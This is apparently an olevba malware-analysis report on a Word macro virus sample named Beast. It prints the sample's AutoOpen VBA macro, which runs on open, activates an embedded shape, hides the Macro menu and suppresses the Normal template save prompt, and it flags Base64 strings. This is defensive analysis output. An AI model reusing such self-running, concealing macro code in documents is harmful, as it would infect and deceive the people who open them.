olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Beast-24d1de91e94c3786f4cf2f33a0fdeb9c9f0b1024
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Beast-24d1de91e94c3786f4cf2f33a0fdeb9c9f0b1024 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Sub AutoOpen()
  If DateDiff("s", CDate(GetSetting("3BEPb", "Startup", "date", 0)), Time) > 300 Then
    ActiveDocument.Shapes("3BEPb").Activate
    Selection.HomeKey Unit:=wdStory
    CommandBars("Tools").Controls("Macro").Visible = False
    Options.SaveNormalPrompt = False
  End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

